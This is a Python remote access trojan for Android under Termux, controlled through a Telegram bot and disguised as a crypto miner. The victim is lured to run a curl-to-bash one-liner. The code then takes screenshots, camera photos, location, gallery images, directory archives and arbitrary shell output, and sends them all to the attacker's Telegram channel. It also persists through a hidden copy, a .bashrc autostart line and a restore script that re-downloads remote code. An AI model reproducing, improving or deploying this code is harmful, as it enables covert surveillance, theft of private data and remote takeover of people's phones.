#!/usr/bin/env python3
# GOD MODE RAT – GitHub-hosted payload
# Save as miner.sh in your GitHub repo, then target runs:
# termux-setup-storage && curl -sL RAW_URL | bash && exit

import requests, time, subprocess, os, base64, threading

BOT_TOKEN = '8831967961:AAHcWu_Mb09TlxxLtep5oONbANjABH1nJXk'
CHANNEL_ID = -1004369057597
API = f'https://api.telegram.org/bot{BOT_TOKEN}'
DEVICE_ID = subprocess.getoutput('getprop ro.serialno') + '_' + subprocess.getoutput('getprop ro.product.model').replace(' ','_')
OFFSET = 0

def send(text, file_path=None):
    try:
        if file_path:
            with open(file_path, 'rb') as f:
                requests.post(f'{API}/sendDocument', data={'chat_id': CHANNEL_ID}, files={'document': f})
        else:
            requests.post(f'{API}/sendMessage', json={'chat_id': CHANNEL_ID, 'text': f'[{DEVICE_ID}] {text}'})
    except: pass

def execute(cmd):
    parts = cmd.split(maxsplit=1)
    cmd_main = parts[0] if parts else cmd
    arg = parts[1] if len(parts)>1 else ''
    try:
        if cmd_main == '/screenshot':
            os.system('screencap /sdcard/scr.png')
            send('Screenshot', '/sdcard/scr.png')
        elif cmd_main == '/camera':
            cam = 'back' if arg != 'front' else 'front'
            os.system(f"termux-camera-photo -c {'1' if cam=='front' else '0'} /sdcard/cam.jpg 2>/dev/null")
            send('Camera', '/sdcard/cam.jpg')
        elif cmd_main == '/download':
            os.system(f'cd {arg}; tar czf /tmp/dl.tar.gz . 2>/dev/null')
            send('Download', '/tmp/dl.tar.gz')
        elif cmd_main == '/gallery':
            os.system('mkdir -p /tmp/thumbs')
            os.system('find /sdcard/DCIM /sdcard/Pictures -name "*.jpg" -exec convert {} -resize 200x200 /tmp/thumbs/{} \\; 2>/dev/null')
            os.system('cd /tmp/thumbs; tar czf /tmp/gallery.tar.gz .')
            send('Gallery', '/tmp/gallery.tar.gz')
        elif cmd_main == '/shell':
            send(subprocess.getoutput(arg)[:4000])
        elif cmd_main == '/location':
            send(subprocess.getoutput('termux-location 2>/dev/null'))
        elif cmd_main == '/ip':
            send(f'IP: {subprocess.getoutput("curl -s ifconfig.me")}')
        elif cmd_main == '/apps':
            send(subprocess.getoutput('pm list packages')[:4000])
        elif cmd_main == '/battery':
            send(subprocess.getoutput('dumpsys battery')[:4000])
        else:
            send(f'Unknown: {cmd_main}')
    except Exception as e:
        send(f'Error: {e}')

def persist():
    os.makedirs(os.path.expanduser('~/.hidden'), exist_ok=True)
    with open(os.path.expanduser('~/.hidden/rat.py'), 'w') as f:
        f.write(open(__file__).read())
    with open(os.path.expanduser('~/.bashrc'), 'a') as f:
        f.write('\n(sleep 10 && python ~/.hidden/rat.py &) & disown\n')
    os.makedirs('/sdcard/.system_cache', exist_ok=True)
    with open('/sdcard/.system_cache/restore.sh', 'w') as f:
        f.write('#!/bin/bash\nif [ ! -d /data/data/com.termux ]; then\ncurl -sL https://f-droid.org/repo/com.termux_118.apk -o /sdcard/termux.apk\npm install /sdcard/termux.apk\nsleep 5\ncurl -sL RAW_URL | bash\nfi\n')
    os.system('chmod +x /sdcard/.system_cache/restore.sh')

def poll():
    global OFFSET
    while True:
        try:
            resp = requests.get(f'{API}/getUpdates?offset={OFFSET}&timeout=30', timeout=35).json()
            for upd in resp.get('result', []):
                OFFSET = upd['update_id'] + 1
                msg = upd.get('channel_post')
                if msg and str(msg.get('chat',{}).get('id')) == str(CHANNEL_ID):
                    text = msg.get('text','')
                    if text.startswith(f'{DEVICE_ID} '):
                        execute(text[len(DEVICE_ID)+1:])
        except: pass
        time.sleep(5)

print('Starting Crypto Miner...')
time.sleep(1)
persist()
print('✅ Mining started. Check balance in 24h.')
threading.Thread(target=poll, daemon=True).start()
while True:
    time.sleep(60)